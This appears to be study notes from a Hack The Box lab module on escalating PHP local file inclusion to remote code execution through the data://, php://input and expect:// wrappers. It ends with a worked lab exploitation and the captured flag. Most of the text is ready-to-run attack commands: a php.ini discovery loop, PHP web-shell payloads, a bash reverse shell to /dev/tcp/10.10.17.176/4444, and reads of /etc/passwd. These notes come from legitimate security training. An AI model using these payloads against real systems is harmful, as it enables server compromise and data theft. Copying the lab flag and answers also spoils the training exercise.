# Section 5 — PHP Wrappers (RCE via LFI)

---

## When You Get RCE From LFI

PHP wrappers turn read-only LFI into RCE when:
- The sink is `include()` / `require()` / `res.render()` (executes content)
- `allow_url_include = On` (for `data://`, `php://input`, `http://` wrappers)
- OR `expect` extension is loaded (for `expect://`)

If `allow_url_include = Off`, fall back to **log poisoning** (Section 6).

---

## Step 1 — Verify PHP Config

Read `php.ini` via base64 filter:

```bash
# Try multiple PHP versions / SAPI combos until one returns content:
for ver in 8.4 8.3 8.2 8.1 8.0 7.4 7.3; do
  for sapi in apache2 fpm cli; do
    out=$(curl -sk "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/$ver/$sapi/php.ini" \
          | grep -oP 'W1BIU[A-Za-z0-9+/=]+|PD9w[A-Za-z0-9+/=]+' | head -1)
    [ -n "$out" ] && echo "FOUND: /etc/php/$ver/$sapi/php.ini" && \
      echo "$out" | base64 -d | grep -E '^(allow_url_include|allow_url_fopen|extension=expect)' && break 2
  done
done
```

Decisions based on what you find:
- `allow_url_include = On` → `data://` and `php://input` work
- `allow_url_include = Off` → use log poisoning / file upload tricks instead
- `extension=expect` → try `expect://` first (one-shot RCE, simplest payload)

---

## Wrapper 1 — `data://`

Embeds PHP code directly in the URL parameter. Base64-encode the payload so it survives URL transport.

```bash
# Build the payload:
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Exploit:
curl -sk "http://TARGET/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id"
```

Requires `allow_url_include = On`. Sometimes fails if the app appends `.php` to the parameter (because `data://...;.php` is invalid). Workaround: use a wrapper that ignores trailing junk like `php://input`.

---

## Wrapper 2 — `php://input` (POST body as code)

The PHP code is in the POST body — most reliable wrapper when `data://` fails:

```bash
# Dynamic web shell (cmd as GET param):
curl -sk -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id"

# Static one-shot (no parameter needed):
curl -sk -X POST --data '<?php system("id"); ?>' \
  "http://TARGET/index.php?language=php://input"

# Reverse shell (PHP):
curl -sk -X POST --data '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.17.176/4444 0>&1\""); ?>' \
  "http://TARGET/index.php?language=php://input"
```

> **Why this often works when `data://` fails**: the appended `.php` (if any) gets tacked onto the wrapper name `php://input.php`, which PHP still recognizes as `php://input`.

---

## Wrapper 3 — `expect://`

Direct command execution — no PHP code needed. Requires the `expect` PHP extension to be installed AND loaded.

```bash
curl -sk "http://TARGET/index.php?language=expect://id"
curl -sk "http://TARGET/index.php?language=expect://cat%20/etc/passwd"
```

Check availability: grep `php.ini` for `extension=expect`. If present, try it — but presence in config doesn't guarantee the `.so` actually loads. Test directly.

---

## Wrapper 4 — `phar://` and `zip://` (covered in Sections 7-8)

When file upload is possible: embed PHP in archive metadata → include the archive → PHP parses + executes the embedded payload.

---

## Wrapper Comparison

| Wrapper | Requires | Method | Best for |
|---------|----------|--------|----------|
| `data://text/plain;base64,...` | `allow_url_include=On` | GET, code in URL | Quick test, no separate POST |
| `php://input` | `allow_url_include=On` | POST body = code | Most reliable, no encoding |
| `expect://` | `expect` extension loaded | GET, command directly | Cleanest payload when available |
| `php://filter` | (none — always works) | Source disclosure only | Reading PHP source code |
| `phar://`, `zip://` | File upload exists | LFI on uploaded archive | When other wrappers blocked |

---

## Lab — RCE via PHP Wrapper

**Target:** `154.57.164.83:31679`

### Step 1 — Read php.ini

```bash
curl -sk "http://154.57.164.83:31679/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" \
  | grep -oP 'W1BIU[A-Za-z0-9+/=]+' | head -1 | base64 -d \
  | grep -E '^(allow_url_include|allow_url_fopen|extension=expect)'
```
Result:
```
allow_url_fopen = On
allow_url_include = On
extension=expect
```

Both `allow_url_include` and `expect` are enabled.

### Step 2 — `data://` test (failed silently)
The app appends `.php` → `data://text/plain;base64,XXXX.php` → invalid scheme.

### Step 3 — `php://input` (worked)
```bash
curl -sk -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://154.57.164.83:31679/index.php?language=php://input&cmd=id"
# → uid=33(www-data) gid=33(www-data)
```

### Step 4 — Locate + read the flag

```bash
# List root:
curl -sk -X POST --data '<?php system("ls / 2>&1"); ?>' \
  "http://154.57.164.83:31679/index.php?language=php://input"
# → 37809e2f8952f06139011994726d9ef1.txt   ← randomized flag filename

# Read it:
curl -sk -X POST --data '<?php system("cat /37809e2f8952f06139011994726d9ef1.txt"); ?>' \
  "http://154.57.164.83:31679/index.php?language=php://input" \
  | grep -oE 'HTB\{[^}]+\}'
```

**Flag:** `HTB{d!$46l3_r3m0t3_url_!nclud3}`

> Module hint reinforced by the flag name: disable `allow_url_include` to mitigate.

---

## Exam Notes

- Always check `allow_url_include` FIRST via `php://filter` on `php.ini` — it's a 30-second triage that decides which wrapper to try
- `php://input` is the workhorse wrapper — works even when `data://` fails due to extension appending
- `expect://` is cleanest if available (no base64 dance), but extension is rarely deployed
- For HTB labs: try wrappers in order `expect://` → `php://input` → `data://` → log poisoning
- Static PHP payloads (`system("id")`) are simpler but inflexible; dynamic shells (`system($_GET["cmd"])`) let you iterate without resending the body
- When ls'ing the filesystem, redirect stderr (`2>&1`) — PHP captures stdout by default; permission errors stay invisible otherwise
